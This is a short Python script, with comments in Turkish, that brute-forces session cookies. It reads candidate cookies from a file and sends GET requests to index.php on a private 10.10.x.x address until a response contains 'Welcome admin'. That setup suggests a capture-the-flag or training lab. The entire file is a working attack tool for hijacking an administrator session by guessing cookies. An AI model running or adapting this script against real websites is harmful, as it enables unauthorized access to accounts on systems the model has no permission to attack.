import requests
#index.php cookileri degistirerek get istegi atıyor, response olarak welcome admin yazısı varsa, başarılı case'i donuyor.
cookies_file = 'cookieslist.txt'
url = 'http://10.10.147.141/index.php'

with open(cookies_file, 'r') as file:
    cookies_list = file.readlines()

for cookie in cookies_list:
    cookie = cookie.strip()  # Satır sonu karakterleri
    cookies_dict = {}
    
    for part in cookie.split(';'):
        key, value = part.strip().split('=', 1)
        cookies_dict[key] = value

    response = requests.get(url, cookies=cookies_dict)
  
    if "Welcome admin" in response.text:
        print(f"Başarılı çerez bulundu: {cookie}")
        print(response.text)
        break
    else:
        print(f"Başarısız çerez: {cookie}")

